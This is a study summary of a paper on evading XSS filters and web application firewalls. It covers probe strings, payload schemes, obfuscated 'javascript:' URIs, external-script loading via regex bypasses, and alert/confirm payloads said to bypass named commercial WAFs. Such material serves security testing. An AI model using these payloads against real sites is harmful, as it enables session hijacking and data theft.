My summary of "Bypassing XSS Detection Mechanisms" - Somdev Sangwan

Full article: https://github.com/s0md3v/MyPapers/tree/master/Bypassing-XSS-detection-mechanisms

# Note

- ```{string}```: represents a component of a payload scheme.
- ```{?string}```: represents an optional component.
- The word **primary character**: refers to a character which must be included in a payload.
- It is advised to URL encode unsafe characters such as ```+``` and ```&``` before using them in payloads.
- While probing, a hamless string should be use instead of ```{javascript}```.

# HTML Context

- Outside Tag - ```<span>You entered $input</span>```
- Inside Tag - ```<input type="text" value="$input">```

## Outside Tag

The **primary character** for this context is ```<``` which is reponsible for starting an HTML tag
A tag name must start with an alphabet. Following probes can be used to determine the regex being to match the tag name: 
- ```<svg``` - If passes, no tag checking is in place
- ```<dev``` - If fails, ```<[a-z]+```
- ```x<dev``` -  If passes, ```^<[a-z]+```
- ```<dEv``` - If fails, ```<[a-zA-Z]+```
- ```<d3V``` - If fails, ```<[a-zA-Z0-9]+```
- ```<d|3v``` - If fails, ```<.+```

If none of these probes are allowed -> can not be bypass.

If any of these probes are allowed -> a number of payload schemes can be used to craft a payload.

### Payload Scheme #1

```{tag}{filler}{event_handler}{?filler}={?filler}{javascript}{?filler}{>,//,Space,Tab,LF}```

Follwing probes can be use to determine the regex being to match the filler between tag and event handler:
- ```<tag xxx``` - If fails, ```{space}```
- ```<tag%09xxx``` - If fails, ```[\s]```
- ```<tag%09%09xxx``` - If fails, ```\s+```
- ```<tag/xxx``` - If fails, ```[\s/]+```
- ```<tag%0axxx``` - If fails, ```[\s\n]+```
- ```<tag%0dxxx``` - If fails, ```[\s\n\r+]+```
- ```<tag/~/xxx``` - If fails, ```.*+```

Event handler is one of the most crucial parts of the payload structer. It is often matched by either a regex of kind ```on\w+``` (can not be bypass) or a blacklist such as ```on(load|click|error|show``` (can be bypas by using less known event handlers). The type of approach can be identified by two simple checks:
- ```<tag{filler}onxxx}``` - If fails, ```on\w+```. If passes, ```on(load|click|error|show)```
- ```<tag{filler}onclick``` - If passes, no event handler checking regex is in place

Some event handlers that Somdev has found absent from blacklists in his experience with WAFs are:

```
onauxclick
ondblclick
oncontextmenu
onmouseleave
ontouchcancel 
```

If all event handlers are blacklisted, you should move on to the next payload scheme.

The testing of ```?{filler}``` adjacent to ```=``` is similar to the filler discussed earlier and should be only tested if ```<tag{filler}{event_handler}=d3v``` is being blocked.

The next component ```{javascript}``` is the JavaScript code to be executed. 

At this point, all components of the payload are put together and only needs to be closed:

- ```<payload>```
- ```<payload```
- ```<payload{space}```
- ```<payload//```
- ```<payload%0a```
- ```<payload%0d```
- ```<payload%09```

### Payload Scheme #2

```<sCriPt{filler}sRc{?filler}={?filler}{url}{?filler}{>,//,Space,Tab,LF}```

Testing for filler, as well as ending string is similar to the previous payload scheme.

It must be noted that a ```?``` can be used at the end of the URL (if a filler hasn't been used after the URL) instead of ending the tag. 

Payloads using ```<object>``` tag can be crafted using a similar payload scheme:

```<obJecT{filler}data{?filler}={?filler}{url}{?filler}{>,//,Space,Tab,LF}```

### Payload Scheme #3

This payload scheme has two variants: plain and obfuscatable

- Plain: ```<A{filler}hReF{?filler}={?filler}JavaScript:{javascript}{?filler}{>//,Space,Tab,LF}```
- Obfuscatable: ```<A{filler}hReF{?filler}={?filler}{quote}{special}:{javascript}{quote}{?filler}{>,//,Space,Tab,LF}```

The noticeable difference between these two variants is the ```{special}``` as well as the ```{quote}```. 

The ```{special}``` refers to an obfuscated version of the string ```javascipt``` using newline and horizontal tab:

- ```j%0aAv%0dasCr%09ipt```
- ```J%0aa%0av%0aa%0as%0ac%0ar%0ai%0ap%0aT%0a```
- ```J%0aa%0dv%09a%0as%0dc%09r%0ai%0dp%09T%0d%0a```

Numeric character encoding (both decimal and hexadecimal) can also be used:

- ```&#74;avascript&colon;```
- ```jav&#x61;&#115;cript:```

These two obfuscation techniques can be used together:

- ```&#74;ava%0a%0d%09script&colon;```

### Executable and Non-executable Context

Outside tag context can be futher divided into **Executable** and **Non-executable** context based on whether or not the injection payload can execute without any special aid.

Non-executable context occurs when the input gets reflect within a HTML comment i.e. ```<--$input-->``` or between the following tags:

```
<style>
<title>
<noembed>
<template>
<noscript>
<textarea>
```

These tags must be closed in order to execute the payload. Thus, the only difference between testing exectuable and non-executable context is the testing of the ```{closing tag}``` component, which can be done as follows:

- ```</tag>```
- ```</tAg/x>```
- ```</tag{space}>```
- ```</tag//>```
- ```</tag%0a>```
- ```</tag%0d>```
- ```</tag%09>```

Once a working closing tag scheme is discovered, ```{closing tag}{any payload from executable payload section}``` can be used for a successful injection.

## Inside Tag

### Generic Attributes

e.g. ```<input type="text" value="$input">```

It can be divided into two categories based on the interactivity of the concerned tag

- Interactable: the input is getting reflected within a tag which can be interacted with e.g. clicking, hovering, focusing etc
- Intractable: the input is getting reflected within a tag which cannot be interacted with

#### Interactable

The **primary character** for this context is the quote used to break out of the context. The payload scheme is:

```{quote}{filler}{event_handler}{?filler}={?filler}{javascript}```

Checking if the quote is being blocked with the probe below:

```x"y```

Some event handlers can be used with any tag:

```
onclick
onauxclick
ondblclick
ondrag
ondragend
ondragenter
ondragexit
ondragleave
ondragover
ondragstart
onmousedown
onmouseenter
onmouseleave
onmousemove
onmouseout
onmouseover
onmouseup
```

#### Intractable

Breaking out of the tag itself is require to execute the payload. The payload scheme is:

```{quote}>{any payload scheme from html context section}```

### Inside an Event Handler

e.g. ```tag event_handler="function($input)";```

Triggering the event handler will execute the JavaScript present in the value.

### Inside 'src' Attribute

e.g. ```<script src="$input">```

A malicious script (in case of script tag) or webpage (in case of iframe tag) can be loaded directly.

Bypassing URL matching regex:

- ```//example.com/xss.js``` bypasses ```http(s)?//```
- ```////////example.com/xss.js``` bypasses ```(http(s)?)?//```
- ```/\///\\/example.com/xss.js``` bypasses ```(http(s)?)?//+```

### Inside 'srcdoc' Attribute

e.g. ```<iframe srcdoc="$input">```

An escaped (with HTML entities) can be supplied as the payload as follow:

```<iframe srcdoc="&lt;svg/onload=alert()&gt;">```

## JavaScript Context

### Inside String Variable

e.g. ```var name = '$input';```

### Payload Scheme #1

```{quote}{delimiter}{javascript}{delimiter}{quote}```

The component ```{delimeter}``` is usually a JavaScript operator. For instance, if the user input lands in a single quoted string variables, possible payload would be:

```
'^{javascript}^'
'*{javascript}*'
'+{javascript}+'
'/{javascript}/'
'%{javascript}%'
'|{javascript}|'
'<{javascript}<'
'>{javascript}>'
```

### Payload Scheme #2

```{quote}{delimiter}{javascript}//```

It is similar to the previous payload scheme except that it use a single line comment to comment out of the rest of the code. Some payload that can be crafted using this payload scheme are:

```
'<{javascript}//'
'|{javascript}//'
'^{javascript}//'
```

### Within Code Blocks

e.g.

```js
function example(age, subscription){
    if (subscription){
        if (age > 18){
            another_function('$input');
        }
    else{
        console.log('Requirements not met.');
    }
}
```

If the user input is ```');}}alert();if(true){('```, it will reflected as follows:

```js
function example(age, subscription){
    if (subscription){
        if (age > 18){
            another_function('');}}alert();if(true){('');
        }
    else{
        console.log('Requirements not met.');
    }
}
```

Here's an indented view to understand how the payload works

```js
function example(age, subscription){
    if (subscription){
        if (age > 18){
            another_function('');
        }
    }
    alert();
    if (true){
        ('');
    }
    else{
        console.log('Requirements not met.');
    }
}
```

The payload for the code block above can be obfuscated as:

```');%0a}%0d}%09alert();/*anything here*/if(true){//anything here%0a('```

If the input is getting reflected into JavaScript code whether it is in a code block or a variable string, ```</scRipT{?filler}>{html context payload}``` can be used to break out of the context and execute the payload.

## Bypassing WAF in Wild

**Name:** Cloudflare\
**Payload:** `<a"/onclick=(confirm)()>click`\
**Bypass Technique:** Non-white space filler

**Name:** Wordfence\
**Payload:** `<a/href=javascript&colon;alert()>click`\
**Bypass Technique:** Numeric character encoding

**Name:** Barracuda\
**Payload:** `<a/href=&#74;ava%0a%0d%09script&colon;alert()>click`\
**Bypass Technique:** Numeric character encoding

**Name:** Akamai\
**Payload:** `<d3v/onauxclick=[2].some(confirm)>click`\
**Bypass Technique:** Missing event handler from blacklist and function call obfuscation

**Name:** Comodo\
**Payload:** ```<d3v/onauxclick=(((confirm)))``>click```\
**Bypass Technique:** Missing event handler from blacklist and function call obfuscation

**Name:** F5\
**Payload:** `<d3v/onmouseleave=[2].some(confirm)>click`\
**Bypass Technique:** Missing event handler from blacklist and function call obfuscation

**Name:** ModSecurity\
**Payload:** `<details/open/ontoggle=alert()>`\
**Bypass Technique:** Missing tag (event handler too?) from blacklist

**Name:** dotdefender\
**Payload:** `<details/open/ontoggle=(confirm)()//`\
**Bypass Technique:** Missing tag from blacklist, function call obfuscation and alternate tag ending

